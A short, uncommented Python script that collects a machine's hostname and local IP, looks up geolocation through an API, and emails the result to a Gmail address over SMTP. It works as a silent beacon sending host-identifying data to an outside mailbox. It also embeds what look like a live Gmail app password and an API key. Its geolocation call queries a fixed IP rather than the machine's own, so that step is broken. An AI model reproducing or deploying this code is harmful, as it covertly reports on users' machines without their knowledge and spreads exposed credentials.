from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import json
import smtplib
import socket
import requests


sender_email   = "xboss.developer@gmail.com"
receiver_email = "xboss.developer@gmail.com"
password       = "doneqrmjfhbxlpwv"
hostname       = socket.gethostname()
ip_address     = socket.gethostbyname(hostname)

message            = MIMEMultipart("alternative")
message["From"]    = sender_email
message["To"]      = receiver_email
text               = ip_address+' '+hostname

ipR = None
try:
    ipR = requests.get('https://api.ipgeolocation.io/ipgeo?apiKey=f9dd9c2cea00459bb251f3ea4bb22d19&ip=46.222.34.204')
    ipR = ipR.json()
    ipR = ipR['ip']+" "+ipR['continent_name']+" "+ipR['country_name']+" "+ipR['city']
    text = ipR
    message["Subject"] = ipR
except:
    message["Subject"] = ip_address+' '+hostname

part1 = MIMEText(text, "plain")
message.attach(part1)

with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
    server.login(sender_email, password)
    server.sendmail( sender_email, receiver_email, message.as_string())
    server.quit()

